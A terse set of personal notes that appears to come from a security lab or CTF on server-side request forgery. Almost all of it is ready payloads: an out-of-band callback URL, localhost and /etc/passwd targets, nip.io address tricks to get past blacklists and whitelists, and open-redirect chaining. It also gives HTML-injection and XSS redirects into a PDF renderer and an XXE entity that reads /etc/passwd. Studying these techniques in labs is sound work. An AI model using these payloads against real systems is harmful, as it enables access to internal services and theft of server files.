___

![[Pasted image 20241214123720.png]]

https://app.interactsh.com/#/

## Screenshot Context and PDF Context

```
http://puuatcmlkisigmqtcmzzjtswfv8t67vdw.oast.fun
```

```
http://127.0.0.1
```

```
file:///etc/passwd
```

## Blacklisted Resources

```
http://127.1
```

https://nip.io/

`<anything>[.-]<IP Address>.nip.io` in **"dot"**, **"dash"** or **"hexadecimal"** notation to the corresponding `<IP Address>`:

- dot notation: `magic.127.0.0.1.nip.io`
- dash notation: `magic-127-0-0-1.nip.io`
- hexadecimal notation: `magic-7f000001.nip.io`

## Whitelisting and Bypasses

```
http://hackinghub.io.127.0.0.1.nip.io
```

## Chaining Open Redirects

```
https://charcoal.ctfio.com/?redirect=http://localhost:8080
```

## In an Image Context

Scan internal ports, 
Time based
```
http://127.0.0.1:8080/favicon.ico
```

## Chaining HTML Injection

```
<img/src="https://puuatcmlkisigmqtcmzzjtswfv8t67vdw.oast.fun">
```

```
<iframe/src="http://localhost:8080">
```

## Chaining XSS

```
<script>document.write(document.location)</script> 
```

```
<script>window.location = "http://localhost"; </script>
```

```
<script>window.location = "file:///etc/passwd"; </script>
```

instead of calling it directly,

```
<iframe/src=https://mywebsite.com/locationwhere.html>
```

## Chaining XML External Entity (XXE)

```
<img/src="https://puuatcmlkisigmqtcmzzjtswfv8t67vdw.oast.fun">
```

Get the user-agent --> # Prince v10
```xml
<?xml version="1.0"?>
<!DOCTYPE cdl [<!ENTITY asd SYSTEM "file:///etc/passwd">]>
<cdl>&asd;</cdl>
```


